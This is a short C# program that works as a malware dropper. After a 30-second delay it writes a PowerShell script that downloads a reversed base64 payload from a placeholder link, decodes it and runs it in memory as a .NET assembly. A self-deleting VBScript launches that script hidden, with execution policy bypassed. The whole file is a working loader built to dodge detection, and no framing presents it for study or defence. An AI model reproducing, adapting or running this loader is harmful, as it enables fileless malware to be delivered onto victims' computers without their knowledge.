ausing System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace ConsoleApp1
{

    public class Program
    {
        public static void Main()
        {
            Thread.Sleep(30 * 1000); // delay 30 sec

            List<string> cmd = new List<string>
            {  
                "Sleep -Seconds 3",
                "$web = New-Object System.Net.WebClient;",
                "$string = $web.Downloadstring('REVERSED BASE 64 PAYLOAD LINK CAN BE PLACED HERE');", // payload base 64!!
                "$assembly = [AppDomain]::CurrentDomain.Load([Convert]::Frombase64String(-join $string[-1..-$string.Length]));",
                "$methodInfo = $assembly.EntryPoint;",
                "$create = $assembly.CreateInstance($methodInfo.Name);",
                "$methodInfo.Invoke($create,$null);"
            };

            string filePS1 = Path.GetTempFileName() + ".ps1";
            using (StreamWriter sw = new StreamWriter(filePS1))
            {
                foreach (string line in cmd)
                {
                    sw.WriteLine(line);
                }
            }

            string fileVbs = Path.GetTempFileName() + ".vbs";
            using (StreamWriter sw = new StreamWriter(fileVbs))
            {
                sw.WriteLine("WScript.Sleep 3000");
                sw.WriteLine("Dim shell,command");
                sw.WriteLine("command = \"powershell -windo 1 -noexit -exec bypass -file \"\"" + filePS1 + "\"\"\"");
                sw.WriteLine("Set shell = CreateObject(\"WScript.Shell\")");
                sw.WriteLine("shell.Run command,0");
                sw.WriteLine("Dim fso");
                sw.WriteLine("Set fso = CreateObject(\"Scripting.FileSystemObject\")");
                sw.WriteLine("fso.DeleteFile(\"" + fileVbs + "\")");
            }

            Process.Start(fileVbs);
        }
    }
}
